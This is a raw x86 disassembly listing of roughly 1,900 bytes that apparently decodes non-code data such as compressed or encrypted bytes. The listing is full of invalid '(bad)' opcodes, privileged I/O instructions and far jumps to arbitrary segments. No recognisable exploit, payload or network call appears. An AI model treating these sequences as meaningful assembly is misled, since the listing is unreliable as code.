  44cf43:	lock jo 0x44cfbb
  44cf46:	rcl    DWORD PTR [esi+0xc],1
  44cf49:	pop    es
  44cf4a:	scas   al,BYTE PTR es:[edi]
  44cf4b:	and    eax,0xf2bbb009
  44cf50:	in     eax,dx
  44cf51:	add    BYTE PTR [esi-0x74648f85],bh
  44cf57:	xchg   ecx,eax
  44cf58:	sbb    BYTE PTR [ebx],cl
  44cf5a:	repz sub DWORD PTR [ecx+ebp*8],ebx
  44cf5e:	cmc    
  44cf5f:	mov    edi,0x97a1826
  44cf64:	dec    ebx
  44cf65:	mov    ebp,0x67410d8b
  44cf6a:	inc    ebx
  44cf6b:	ficomp WORD PTR [edi]
  44cf6d:	outs   dx,DWORD PTR ds:[esi]
  44cf6e:	test   BYTE PTR [ecx],dh
  44cf70:	and    eax,0x13559f9
  44cf75:	jg     0x44cff6
  44cf77:	inc    ebx
  44cf78:	pop    eax
  44cf79:	call   0x112a:0x82edb52b
  44cf80:	push   esi
  44cf81:	mov    dh,0x24
  44cf83:	dec    ecx
  44cf84:	test   BYTE PTR [ebp-0x43],al
  44cf87:	hlt    
  44cf88:	inc    eax
  44cf89:	jbe    0x44cfd5
  44cf8b:	jns    0x44cf52
  44cf8d:	nop
  44cf8e:	shr    esi,cl
  44cf90:	jmp    0x44cf72
  44cf92:	pop    esi
  44cf93:	sbb    eax,0x52f5591d
  44cf98:	inc    ecx
  44cf99:	xor    BYTE PTR [edx-0x67],0x24
  44cf9d:	sahf   
  44cf9e:	jnp    0x44cff5
  44cfa0:	aam    0xf3
  44cfa2:	popf   
  44cfa3:	and    dl,BYTE PTR ds:0x4dbaf299
  44cfa9:	mov    DWORD PTR [esi-0x29],esi
  44cfac:	jle    0x44cfa5
  44cfae:	mov    al,0xa4
  44cfb0:	retf   0x6bd2
  44cfb3:	bound  esp,QWORD PTR [ebx+0x44]
  44cfb6:	lahf   
  44cfb7:	dec    eax
  44cfb8:	fwait
  44cfb9:	inc    ecx
  44cfba:	pop    ecx
  44cfbb:	jbe    0x44cfd3
  44cfbd:	jns    0x44cf7a
  44cfbf:	repnz dec eax
  44cfc1:	mov    ah,0xee
  44cfc3:	pop    edx
  44cfc4:	(bad)  
  44cfc5:	fwait
  44cfc6:	mov    ebx,0x4382b327
  44cfcb:	sub    al,0x1a
  44cfcd:	loope  0x44cfe4
  44cfcf:	jnp    0x44cfec
  44cfd1:	jmp    0x5c342c77
  44cfd6:	pop    edi
  44cfd7:	ins    DWORD PTR es:[edi],dx
  44cfd8:	aam    0xb8
  44cfda:	imul   ecx,DWORD PTR [ebp+0x4cf4abe1],0xffffff94
  44cfe1:	pop    esi
  44cfe2:	sti    
  44cfe3:	dec    edx
  44cfe4:	push   ss
  44cfe5:	sub    DWORD PTR [edx],ebx
  44cfe7:	stos   DWORD PTR es:[edi],eax
  44cfe8:	out    dx,al
  44cfe9:	retf   
  44cfea:	das    
  44cfeb:	jo     0x44cf9d
  44cfed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44cfee:	sti    
  44cfef:	dec    edi
  44cff0:	stos   BYTE PTR es:[edi],al
  44cff1:	sub    cl,0x66
  44cff4:	inc    ebx
  44cff5:	std    
  44cff6:	sti    
  44cff7:	push   edi
  44cff8:	and    ah,dh
  44cffa:	mov    ebp,0x74cbb804
  44cfff:	mov    ebx,0x216709d7
  44d004:	aaa    
  44d005:	cdq    
  44d006:	dec    ebx
  44d007:	fdivr  QWORD PTR [edx+0x17253c9d]
  44d00d:	jns    0x44cf98
  44d00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d010:	xor    eax,0xfb031282
  44d015:	leave  
  44d016:	sub    ebp,DWORD PTR [eax]
  44d018:	mov    esp,DWORD PTR [eax+0x33]
  44d01b:	sbb    dx,WORD PTR [edi-0x32a4869]
  44d022:	iret   
  44d023:	lods   al,BYTE PTR ds:[esi]
  44d024:	lea    ecx,[edi+0x3f]
  44d027:	jmp    0x44d0a1
  44d029:	dec    edi
  44d02a:	lock jns 0x44cfe1
  44d02d:	sub    al,0xca
  44d02f:	das    
  44d030:	adc    dl,dl
  44d032:	gs jae 0x44d07b
  44d035:	or     al,0x4a
  44d037:	aam    0x2b
  44d039:	lds    eax,FWORD PTR [si-0x5ed5]
  44d03e:	fstp   DWORD PTR [ebp-0x2ba746e1]
  44d044:	pusha  
  44d045:	xor    eax,0x9ca406f9
  44d04a:	fisttp DWORD PTR [ecx-0x38]
  44d04d:	sub    bl,BYTE PTR ds:0x65d08156
  44d053:	or     bh,dl
  44d055:	jns    0x44d00a
  44d057:	xor    al,0x11
  44d059:	sbb    eax,0x9bc7950c
  44d05e:	inc    edx
  44d05f:	xor    al,0x1
  44d061:	call   0xb5fe:0x2f191265
  44d068:	mov    ah,0x84
  44d06a:	repnz lods eax,DWORD PTR ds:[esi]
  44d06c:	cld    
  44d06d:	xchg   DWORD PTR [ecx+0x3fab4304],esi
  44d073:	aad    0xa5
  44d075:	push   ecx
  44d076:	sub    edi,0x5cbfc886
  44d07c:	push   ds
  44d07d:	jns    0x44d0c1
  44d07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d080:	scas   al,BYTE PTR es:[edi]
  44d081:	ret    0x22e5
  44d084:	retf   0x7322
  44d087:	hlt    
  44d088:	add    eax,0x72f136d4
  44d08d:	jmp    0xbf43:0x79167c4d
  44d094:	sbb    al,ah
  44d096:	ja     0x44d01e
  44d098:	mov    ds:0x757eb2b7,eax
  44d09d:	mov    ecx,0xd0dfe5ad
  44d0a2:	mov    bl,0x25
  44d0a4:	fisttp DWORD PTR [edx]
  44d0a6:	dec    edx
  44d0a7:	push   esi
  44d0a8:	and    ch,BYTE PTR [ecx]
  44d0aa:	mov    WORD PTR [eax+0x11],ss
  44d0ad:	mov    DWORD PTR [ecx],edi
  44d0af:	xcrypt-ecb (bad)
  44d0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d0b1:	into   
  44d0b2:	push   edi
  44d0b3:	pop    ss
  44d0b4:	aad    0x4f
  44d0b6:	mov    edx,0x50d3fdea
  44d0bb:	stos   BYTE PTR es:[edi],al
  44d0bc:	or     al,0xbb
  44d0be:	leave  
  44d0bf:	xor    al,0xbb
  44d0c1:	dec    ecx
  44d0c2:	fsubr  QWORD PTR [esi]
  44d0c4:	mov    ds:0x3730cf38,al
  44d0c9:	stos   BYTE PTR es:[edi],al
  44d0ca:	xor    al,0xe4
  44d0cc:	ja     0x44d052
  44d0ce:	test   al,0xe3
  44d0d0:	pop    ds
  44d0d1:	in     eax,0x8f
  44d0d3:	push   eax
  44d0d4:	inc    esi
  44d0d5:	xchg   ecx,eax
  44d0d6:	adc    al,0x3b
  44d0d8:	adc    eax,0x4d13f8cd
  44d0dd:	stc    
  44d0de:	mov    ecx,0x860e92ec
  44d0e3:	popf   
  44d0e4:	cmc    
  44d0e5:	in     eax,dx
  44d0e6:	jecxz  0x44d0d0
  44d0e8:	mov    ch,0xe2
  44d0ea:	ins    BYTE PTR es:[edi],dx
  44d0eb:	test   eax,0xa0d36937
  44d0f0:	and    BYTE PTR [edi+0xc],ah
  44d0f3:	jl     0x44d097
  44d0f5:	and    edx,ebp
  44d0f7:	and    dh,BYTE PTR [edx+0x5e039bcb]
  44d0fd:	icebp  
  44d0fe:	mov    al,0x7
  44d100:	sbb    dh,BYTE PTR [esi+eax*4-0x51066cc2]
  44d107:	pusha  
  44d108:	pop    ebx
  44d109:	sbb    ebp,edi
  44d10b:	popf   
  44d10c:	fcmovu st,st(4)
  44d10e:	ret    
  44d10f:	mov    ah,0xb6
  44d111:	out    0xb9,eax
  44d113:	xlat   BYTE PTR ds:[ebx]
  44d114:	xchg   ebp,eax
  44d115:	dec    DWORD PTR [ebp-0x33]
  44d118:	in     eax,dx
  44d119:	fwait
  44d11a:	pop    ebx
  44d11b:	inc    eax
  44d11c:	sub    DWORD PTR [eax+0x4922e9d3],eax
  44d122:	mov    edi,0xe5d13b8a
  44d127:	xor    al,0xb6
  44d129:	pushf  
  44d12a:	sbb    ecx,DWORD PTR [edx]
  44d12c:	stos   DWORD PTR es:[edi],eax
  44d12d:	dec    edx
  44d12e:	sub    DWORD PTR [ebx],ebx
  44d130:	cmp    esi,esp
  44d132:	xchg   ecx,eax
  44d133:	sub    ebx,DWORD PTR [edx+0x5f04b45c]
  44d139:	popa   
  44d13a:	(bad)  
  44d13b:	push   edi
  44d13c:	mov    ebx,0xc8ae9435
  44d141:	add    BYTE PTR [esp+edx*2+0x63409a9c],bh
  44d148:	sbb    edi,DWORD PTR [ecx-0x7978a376]
  44d14e:	sysexit 
  44d150:	mov    eax,0x1c4e2b9b
  44d155:	sub    eax,0x10dbe965
  44d15a:	pop    ds
  44d15b:	iret   
  44d15c:	test   al,0xa
  44d15e:	jl     0x44d148
  44d160:	mov    bl,0x1b
  44d162:	jg     0x44d1b4
  44d164:	xor    ah,BYTE PTR [edi+0x5c55e0b0]
  44d16a:	jle    0x44d15b
  44d16c:	cmp    DWORD PTR [ebx+0x69923efc],ecx
  44d172:	sbb    eax,0xb314789e
  44d177:	push   ecx
  44d178:	out    dx,al
  44d179:	hlt    
  44d17a:	mov    edx,0xdf0907e0
  44d17f:	dec    esi
  44d180:	test   eax,ebp
  44d182:	loopne 0x44d16b
  44d184:	mov    esi,0x92cca2cf
  44d189:	xchg   ebp,eax
  44d18a:	call   0xf3ed:0x42aca985
  44d191:	mov    ds:0xf5e00c2b,al
  44d196:	pop    ss
  44d197:	or     ebx,ebp
  44d199:	call   0x64bb:0x60cd7cf3
  44d1a0:	xor    BYTE PTR [ebp+0x2e],ch
  44d1a3:	inc    ecx
  44d1a4:	add    eax,0x86e8fa48
  44d1a9:	arpl   WORD PTR [ebp-0x7c5606f8],si
  44d1af:	xchg   ecx,eax
  44d1b0:	shr    BYTE PTR [esi+0x5fee85fd],1
  44d1b6:	ss pop eax
  44d1b8:	stc    
  44d1b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d1ba:	sti    
  44d1bb:	jecxz  0x44d218
  44d1bd:	fnstenv [eax+0x7a]
  44d1c0:	icebp  
  44d1c1:	es sbb ch,al
  44d1c4:	in     al,dx
  44d1c5:	jmp    0x5b56:0x1186c4b4
  44d1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d1cd:	aam    0xf0
  44d1cf:	out    dx,al
  44d1d0:	(bad)
  44d1d3:	and    eax,0xc23fb916
  44d1d8:	pop    edx
  44d1d9:	jp     0x44d161
  44d1db:	inc    edx
  44d1dc:	enter  0x5ba1,0x96
  44d1e0:	test   eax,0xbf170d98
  44d1e5:	fidivr WORD PTR [ebx-0x4ad7131b]
  44d1eb:	(bad)  
  44d1ec:	int3   
  44d1ed:	cmp    BYTE PTR [ecx+0x30b7c54f],ch
  44d1f3:	cmc    
  44d1f4:	pop    eax
  44d1f5:	and    eax,0x61e1e892
  44d1fa:	mov    ch,0xea
  44d1fc:	push   ebx
  44d1fd:	iret   
  44d1fe:	mov    ebx,0xd78845d4
  44d203:	fs std 
  44d205:	sub    edi,DWORD PTR [eax+ebp*1-0x187de88d]
  44d20c:	xchg   edx,eax
  44d20d:	or     DWORD PTR [ebp+0x23a41f4],edi
  44d213:	jp     0x44d22c
  44d215:	leave  
  44d216:	ror    BYTE PTR [esi+0x7c054f75],1
  44d21c:	xchg   ebp,eax
  44d21d:	adc    edi,DWORD PTR [edx]
  44d21f:	in     eax,0x22
  44d221:	arpl   WORD PTR [ebp+0x2e6b0cc9],ax
  44d227:	push   cs
  44d228:	sbb    BYTE PTR [ecx],bh
  44d22a:	aam    0xec
  44d22c:	fistp  QWORD PTR [ebp+0x2]
  44d22f:	adc    BYTE PTR [esi-0x68e50119],al
  44d235:	int    0x7e
  44d237:	push   ecx
  44d238:	inc    eax
  44d239:	push   ecx
  44d23a:	cs out dx,al
  44d23c:	dec    esp
  44d23d:	cmp    DWORD PTR [ecx+0x6c],edx
  44d240:	lds    edx,FWORD PTR [edx+edx*4+0x3078b7a2]
  44d247:	mov    eax,0xeb55199d
  44d24c:	rcr    DWORD PTR [ebx-0x159ec63f],0xb2
  44d253:	hlt    
  44d254:	cmp    al,0xb9
  44d256:	pop    es
  44d257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d258:	mov    ch,0x7d
  44d25a:	dec    esp
  44d25b:	hlt    
  44d25c:	stc    
  44d25d:	fsubr  st,st(4)
  44d25f:	fist   WORD PTR ds:0xe9a3d6aa
  44d265:	mov    ds:0xe05d464b,al
  44d26a:	cmp    al,0x7f
  44d26c:	lds    eax,FWORD PTR ds:0xd27f0eb
  44d272:	(bad)  
  44d274:	push   ss
  44d275:	mov    ecx,0x69598b81
  44d27a:	mov    DWORD PTR [edi+esi*2],edi
  44d27d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d27e:	imul   edi,DWORD PTR [eax-0x58c69d4a],0xffffffbc
  44d285:	ds jmp 0x44d2bb
  44d288:	lods   al,BYTE PTR ds:[esi]
  44d289:	sub    eax,ecx
  44d28b:	add    al,0xd5
  44d28d:	cmp    al,0x77
  44d28f:	arpl   WORD PTR [ecx-0x5b],dx
  44d292:	mov    ebx,0x6d06e47
  44d297:	mov    al,ds:0x6bef9a1f
  44d29c:	xor    al,0xe3
  44d29e:	mov    dh,0x54
  44d2a0:	retf   
  44d2a1:	fbld   TBYTE PTR [ebp*2-0xe41e34b]
  44d2a8:	int3   
  44d2a9:	jbe    0x44d2f2
  44d2ab:	ret    
  44d2ac:	mov    ebp,0x65b5abfc
  44d2b1:	and    DWORD PTR [esi-0x14],0xffffffcb
  44d2b5:	sti    
  44d2b6:	popa   
  44d2b7:	test   eax,0xadfb2104
  44d2bc:	xchg   ebp,eax
  44d2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d2be:	pop    ecx
  44d2bf:	repnz and DWORD PTR [eax+0x79237a48],0x93bad148
  44d2ca:	lods   al,BYTE PTR ds:[esi]
  44d2cb:	out    0x6c,eax
  44d2cd:	cdq    
  44d2ce:	imul   edx,DWORD PTR [ebp-0xf],0x61
  44d2d2:	test   edi,eax
  44d2d4:	stos   DWORD PTR es:[edi],eax
  44d2d5:	jbe    0x44d2a9
  44d2d7:	push   esp
  44d2d8:	loop   0x44d2a4
  44d2da:	mov    edi,0x39890f4
  44d2df:	scas   eax,DWORD PTR es:[edi]
  44d2e0:	(bad)  
  44d2e1:	push   ss
  44d2e2:	jns    0x44d348
  44d2e4:	push   es
  44d2e5:	and    dh,bl
  44d2e7:	sbb    al,0x18
  44d2e9:	xchg   DWORD PTR [ebx+0x4439177f],eax
  44d2ef:	mov    ebx,0xd606c3b
  44d2f4:	lock push ds
  44d2f6:	lds    esp,FWORD PTR ds:0xce4652a9
  44d2fc:	xchg   ebp,eax
  44d2fd:	dec    edx
  44d2fe:	enter  0x334c,0xdd
  44d302:	pop    eax
  44d303:	mov    dl,0x16
  44d305:	leave  
  44d306:	pop    edx
  44d307:	adc    ebx,DWORD PTR ds:0x42e37b1e
  44d30d:	add    DWORD PTR [ebx-0x7a],eax
  44d310:	gs aas 
  44d312:	outs   dx,BYTE PTR ds:[esi]
  44d313:	out    dx,eax
  44d314:	mov    dl,BYTE PTR [ebp+0x91a33b0]
  44d31a:	jb     0x44d2c7
  44d31c:	ss mov dl,0x14
  44d31f:	xor    BYTE PTR [ecx-0x62],dh
  44d322:	jnp    0x44d2b2
  44d324:	in     eax,dx
  44d325:	jbe    0x44d332
  44d327:	das    
  44d328:	stos   DWORD PTR es:[edi],eax
  44d329:	mov    edi,0x7122a3d6
  44d32f:	jae    0x44d2e2
  44d331:	in     eax,0xbf
  44d333:	les    eax,FWORD PTR [eax]
  44d335:	xchg   edi,eax
  44d336:	retf   0x75d8
  44d339:	jb     0x44d32d
  44d33b:	icebp  
  44d33c:	fild   WORD PTR [eax-0x6f]
  44d33f:	push   esi
  44d340:	pusha  
  44d341:	inc    edi
  44d342:	fild   DWORD PTR [eax+0x48]
  44d345:	rol    ebx,0xf4
  44d348:	stc    
  44d349:	in     al,0x4c
  44d34b:	dec    ecx
  44d34c:	lock pushf 
  44d34e:	sti    
  44d34f:	push   ebx
  44d350:	xchg   esi,eax
  44d351:	push   esi
  44d352:	hlt    
  44d353:	pop    edx
  44d354:	cmp    al,0xe8
  44d356:	adc    al,0x44
  44d358:	adc    BYTE PTR [esi-0x48],dl
  44d35b:	in     al,0xf6
  44d35d:	jne    0x44d3cb
  44d35f:	cli    
  44d360:	xchg   BYTE PTR [ebx],dl
  44d362:	sbb    al,0x1e
  44d364:	aad    0xcb
  44d366:	push   eax
  44d367:	sbb    BYTE PTR [ebp+0x4d],cl
  44d36a:	xor    esi,ecx
  44d36c:	leave  
  44d36d:	add    al,0xbb
  44d36f:	hlt    
  44d370:	clc    
  44d371:	mov    edx,0x9335aa3e
  44d376:	lods   eax,DWORD PTR ds:[esi]
  44d377:	repnz dec esp
  44d379:	imul   esi,ebp,0x9620dc38
  44d37f:	js     0x44d39d
  44d381:	sub    DWORD PTR [ecx],eax
  44d383:	or     al,0x28
  44d385:	mov    edx,0x99f33bc5
  44d38a:	jmp    0x44d311
  44d38c:	mov    edx,0x428d9c7f
  44d391:	or     edx,eax
  44d393:	sub    al,0x19
  44d395:	(bad)  
  44d397:	ret    0xc100
  44d39a:	enter  0x6fbe,0xa0
  44d39e:	sbb    ebx,DWORD PTR [ecx-0x18]
  44d3a1:	loopne 0x44d335
  44d3a3:	out    dx,eax
  44d3a4:	jb     0x44d32c
  44d3a6:	shr    BYTE PTR [ebp-0x4b4bed34],cl
  44d3ac:	or     dh,bh
  44d3ae:	mov    ch,0x88
  44d3b0:	jge    0x44d34f
  44d3b2:	sti    
  44d3b3:	into   
  44d3b4:	jno    0x44d3ba
  44d3b6:	inc    edx
  44d3b7:	mov    bl,0xa6
  44d3b9:	imul   edx,DWORD PTR [ebx],0x5a
  44d3bc:	nop
  44d3bd:	or     esi,DWORD PTR [edi+0x6dfc8394]
  44d3c3:	mov    ?,ebp
  44d3c5:	xchg   edx,eax
  44d3c6:	daa    
  44d3c7:	jmp    0xe7f7:0x9b8f29f
  44d3ce:	es test eax,0x19b2b811
  44d3d4:	inc    ebx
  44d3d5:	addr16 mov bh,0x74
  44d3d8:	test   DWORD PTR [eax-0x58],0x7fa00532
  44d3df:	hlt    
  44d3e0:	xchg   ebp,eax
  44d3e1:	sahf   
  44d3e2:	add    al,cl
  44d3e4:	xor    BYTE PTR [ecx],cl
  44d3e6:	stos   BYTE PTR es:[edi],al
  44d3e7:	loopne 0x44d412
  44d3e9:	dec    esi
  44d3ea:	add    eax,0x5bab249e
  44d3ef:	and    al,0x87
  44d3f1:	out    0x99,al
  44d3f3:	(bad)  
  44d3f4:	rol    DWORD PTR [edi],1
  44d3f6:	ss out dx,eax
  44d3f8:	iret   
  44d3f9:	stos   DWORD PTR es:[edi],eax
  44d3fa:	inc    edi
  44d3fb:	xchg   esp,eax
  44d3fc:	lea    ebx,[ebx+edi*2-0x101f5226]
  44d403:	daa    
  44d404:	loope  0x44d3dd
  44d406:	ins    BYTE PTR es:[edi],dx
  44d407:	test   eax,0x6aeba305
  44d40c:	cmp    ch,BYTE PTR [ecx-0x2]
  44d40f:	push   0xffffff89
  44d411:	mov    DWORD PTR [esi],eax
  44d413:	outs   dx,BYTE PTR ds:[esi]
  44d414:	(bad)  
  44d415:	or     esp,DWORD PTR [ecx-0x483bc120]
  44d41b:	jmp    0x68d7:0xe7cc0da5
  44d422:	adc    DWORD PTR [eax+0x19],eax
  44d425:	dec    ecx
  44d426:	xchg   ch,al
  44d428:	or     bh,cl
  44d42a:	repz pop ebx
  44d42c:	mov    BYTE PTR [esp+edi*1],dl
  44d42f:	jg     0x44d489
  44d431:	add    al,0xdd
  44d433:	xchg   ebp,eax
  44d434:	add    BYTE PTR [edi+0x2928f1b7],cl
  44d43a:	mov    ebx,0xa9b1eead
  44d43f:	cmp    BYTE PTR [ebx-0x19c51eab],bl
  44d445:	dec    esi
  44d446:	rcl    BYTE PTR [edi],cl
  44d448:	jne    0x44d430
  44d44a:	pop    edx
  44d44b:	push   0xffffff9f
  44d44d:	or     esi,DWORD PTR [edx+0x1cb497e4]
  44d453:	mov    ebp,esi
  44d455:	pop    edx
  44d456:	inc    edx
  44d457:	icebp  
  44d458:	xor    ch,BYTE PTR [edi-0x5c]
  44d45b:	mov    bl,0x34
  44d45d:	or     eax,ecx
  44d45f:	xchg   BYTE PTR [esi+0x1a5459b9],bh
  44d465:	imul   edi,esi,0xffffffcc
  44d468:	(bad)  
  44d469:	mov    edi,0x751ccb8c
  44d46e:	mov    ds:0xb5cd99b2,eax
  44d473:	stos   BYTE PTR es:[edi],al
  44d474:	xor    cl,cl
  44d476:	mov    dl,0xe4
  44d478:	test   BYTE PTR [ebx],dl
  44d47a:	xor    DWORD PTR [ebp+esi*4-0x2e],ebp
  44d47e:	test   cl,dh
  44d480:	gs lahf 
  44d482:	or     eax,0xb9491d97
  44d487:	push   ebp
  44d488:	jmp    0xd5cd21f1
  44d48d:	adc    BYTE PTR [edi+eiz*1-0x24d609f5],cl
  44d494:	inc    edi
  44d495:	rol    BYTE PTR [ecx],0xff
  44d498:	jecxz  0x44d4bf
  44d49a:	imul   DWORD PTR [edi-0x5b485e89]
  44d4a0:	arpl   WORD PTR [eax+0x16],cx
  44d4a3:	mov    bh,0x65
  44d4a5:	loopne 0x44d4ef
  44d4a7:	hlt    
  44d4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d4a9:	dec    ecx
  44d4aa:	ins    BYTE PTR es:[edi],dx
  44d4ab:	enter  0xb922,0x11
  44d4af:	mov    al,ds:0x5d050060
  44d4b4:	xchg   ebp,eax
  44d4b5:	jns    0x44d445
  44d4b7:	adc    eax,0xd1cba20c
  44d4bc:	mov    edx,DWORD PTR [ecx]
  44d4be:	jne    0x44d499
  44d4c0:	push   ebx
  44d4c1:	mov    ecx,0xb9cc69e1
  44d4c6:	pop    ebp
  44d4c7:	out    dx,eax
  44d4c8:	xor    bl,bl
  44d4ca:	int3   
  44d4cb:	jo     0x44d472
  44d4cd:	and    DWORD PTR [eax-0x10],ebx
  44d4d0:	shl    dl,1
  44d4d2:	dec    edi
  44d4d3:	mov    ch,0x78
  44d4d5:	mov    al,ds:0xde8ca318
  44d4da:	sub    DWORD PTR [ebp+0x2b],eax
  44d4dd:	mov    edx,0x665cc0a3
  44d4e2:	outs   dx,BYTE PTR ds:[esi]
  44d4e3:	aam    0x75
  44d4e5:	shl    BYTE PTR [ebx+0x3066d6ea],1
  44d4eb:	mov    DWORD PTR [edx],ebx
  44d4ed:	mov    ecx,0x1fd70bf2
  44d4f2:	sub    ah,bh
  44d4f4:	pop    esp
  44d4f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d4f6:	jmp    0x44d4af
  44d4f8:	rol    esp,1
  44d4fa:	fcmove st,st(2)
  44d4fc:	fld    st(5)
  44d4fe:	inc    esp
  44d4ff:	lds    ebx,FWORD PTR [edi]
  44d501:	and    eax,0x91b2f4bb
  44d506:	sbb    al,0xe8
  44d508:	gs jp  0x44d4e8
  44d50b:	out    0x55,eax
  44d50d:	pop    ebx
  44d50e:	cmp    al,0x9
  44d510:	sbb    eax,0x48130859
  44d515:	aad    0xac
  44d517:	pop    edi
  44d518:	jbe    0x44d4b7
  44d51a:	mov    edi,DWORD PTR [ebp-0x17]
  44d51d:	fcmove st,st(6)
  44d51f:	fucomp st(0)
  44d521:	je     0x44d4a8
  44d523:	adc    ebx,DWORD PTR [ebp+0x1a652fda]
  44d529:	(bad)  
  44d52a:	mov    ebx,0x7bdbcdc8
  44d52f:	adc    ch,BYTE PTR [edi]
  44d531:	add    bl,BYTE PTR [ebp+ecx*8-0xfc8ff23]
  44d538:	sbb    ebp,ecx
  44d53a:	mov    ebx,0x16543f37
  44d53f:	pushf  
  44d540:	add    BYTE PTR [edi+0x5a9c2b8b],dh
  44d546:	pop    ds
  44d547:	repnz imul ebx,DWORD PTR [ebp-0x56e38716],0x7991264d
  44d552:	and    DWORD PTR [eax+ebp*8-0x9c72460],ebx
  44d559:	jmp    0x44d4ee
  44d55b:	cwde   
  44d55c:	stos   BYTE PTR es:[edi],al
  44d55d:	enter  0xd590,0x8c
  44d561:	or     ah,cl
  44d563:	or     DWORD PTR fs:[ebx+ecx*2-0x1a],0x1fb9ca7
  44d56c:	aad    0x93
  44d56e:	outs   dx,BYTE PTR ds:[esi]
  44d56f:	ret    0xd123
  44d572:	mov    edx,0xbc8d0558
  44d577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d578:	adc    eax,0x550b20c6
  44d57d:	jmp    0x44d508
  44d57f:	jmp    0x23b48975
  44d584:	and    BYTE PTR [ecx+0x370fdbc5],ch
  44d58a:	stc    
  44d58b:	xor    eax,0xa93d27ab
  44d590:	imul   ebx,DWORD PTR [esp+ebx*4],0xffffffb6
  44d594:	sbb    al,0x79
  44d596:	and    eax,0xfe0d3f13
  44d59b:	aam    0x8b
  44d59d:	mov    edx,0x1c759efa
  44d5a2:	addr16 out 0xd2,eax
  44d5a5:	add    al,0xf0
  44d5a7:	dec    ebx
  44d5a8:	lahf   
  44d5a9:	hlt    
  44d5aa:	adc    DWORD PTR [edi],ebx
  44d5ac:	and    al,BYTE PTR [esi]
  44d5ae:	mov    ebx,0x5e194bf4
  44d5b3:	int    0xa5
  44d5b5:	gs push ds
  44d5b7:	in     eax,0x35
  44d5b9:	enter  0x65c1,0xa3
  44d5bd:	inc    esp
  44d5be:	es and eax,0x34e77c8f
  44d5c4:	mov    esi,0xef56059d
  44d5c9:	les    edi,FWORD PTR [ebx-0x72]
  44d5cc:	add    DWORD PTR [esi],ebx
  44d5ce:	rcl    DWORD PTR [ebp-0x799f30db],cl
  44d5d4:	and    al,0xd9
  44d5d6:	imul   edx,DWORD PTR [eax+ecx*1+0x62f5abd0],0xffffffa4
  44d5de:	sbb    ebx,DWORD PTR [ebx]
  44d5e0:	les    eax,FWORD PTR [edx-0x68]
  44d5e3:	enter  0x356e,0x1a
  44d5e7:	pop    ecx
  44d5e8:	call   0xde8b73b7
  44d5ed:	ins    BYTE PTR es:[edi],dx
  44d5ee:	mov    ecx,0xbb43c56c
  44d5f3:	add    ah,BYTE PTR [esi]
  44d5f5:	ja     0x44d66e
  44d5f7:	popa   
  44d5f8:	and    al,0xa3
  44d5fa:	jns    0x44d673
  44d5fc:	mov    ecx,0x776e2ef0
  44d601:	div    DWORD PTR [esi-0x1999ecfc]
  44d607:	xlat   BYTE PTR ds:[ebx]
  44d608:	add    eax,0x84f2bbb8
  44d60d:	inc    esp
  44d60e:	mov    ecx,0x4d691f33
  44d613:	lods   eax,DWORD PTR ds:[esi]
  44d614:	push   edx
  44d615:	das    
  44d616:	lods   al,BYTE PTR ds:[esi]
  44d617:	daa    
  44d618:	test   DWORD PTR [edx+0x2d],ebx
  44d61b:	int3   
  44d61c:	mov    cs:0x9c59376f,eax
  44d622:	test   BYTE PTR [ecx],ah
  44d624:	lock push 0x6d
  44d627:	push   cs
  44d628:	or     ebp,DWORD PTR [ebp-0x75]
  44d62b:	sbb    eax,esp
  44d62d:	mov    DWORD PTR [ebp+0x106e9284],edi
  44d633:	dec    ebx
  44d634:	in     eax,0x74
  44d636:	imul   ebp,ebp,0x8
  44d639:	scas   al,BYTE PTR es:[edi]
  44d63a:	mov    eax,0xdde92a81
  44d63f:	jne    0x44d608
  44d641:	sbb    bh,ch
  44d643:	aad    0x19
  44d645:	sti    
  44d646:	sbb    eax,0x70b20528
  44d64b:	icebp  
  44d64c:	(bad)  
  44d64d:	daa    
  44d64e:	out    dx,eax
  44d64f:	inc    eax
  44d650:	add    DWORD PTR [edx],ecx
  44d652:	mov    ah,0x6c
  44d654:	lds    ebp,FWORD PTR [eax-0x8d4bc33]
  44d65a:	and    dh,0x55
  44d65d:	imul   edx,DWORD PTR [ebx-0x10],0xffffffa0
  44d661:	mov    al,ds:0xe923c8bc
  44d666:	sbb    ah,BYTE PTR [ebp-0x6b]
  44d669:	xlat   BYTE PTR ds:[ebx]
  44d66a:	xchg   ebx,eax
  44d66b:	mov    gs,WORD PTR [ebx-0x62]
  44d66e:	sub    eax,DWORD PTR [esp+esi*1]
  44d671:	xor    dl,BYTE PTR [ebx]
  44d673:	xor    dl,dh
  44d675:	(bad)  
  44d676:	sbb    BYTE PTR [esi],al
  44d678:	jbe    0x44d69e
  44d67a:	mov    dh,0xf4
  44d67c:	ja     0x44d60a
  44d67e:	dec    ebx
  44d67f:	jmp    0x4fc0:0xe9308d75
  44d686:	ds cmp eax,0x995b79bb
  44d68c:	push   edx
  44d68d:	add    ecx,eax
  44d68f:	ins    BYTE PTR es:[edi],dx
  44d690:	mov    edi,edx
  44d692:	mov    al,0x74
  44d694:	push   cs
  44d695:	jg     0x44d682
  44d697:	mov    eax,ds:0xe5ca8325
  44d69c:	sbb    ebx,DWORD PTR [esi]
  44d69e:	je     0x44d6f7
  44d6a0:	and    DWORD PTR [ecx],ebp
  44d6a2:	leave  
  44d6a3:	rcl    BYTE PTR [ebx],0x7c
  44d6a6:	jnp    0x44d65b
  44d6a8:	fisub  WORD PTR [ecx+0x5dcf15fb]
  44d6ae:	jge    0x44d6b5
  44d6b0:	mov    ecx,0x4cfb033d
  44d6b5:	xchg   edx,eax
  44d6b6:	mov    al,0x44
  44d6b8:	dec    eax
  44d6b9:	aam    0x88
  44d6bb:	add    ch,dl
  44d6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d6be:	pop    ebx
  44d6bf:	retf   0xcb7a
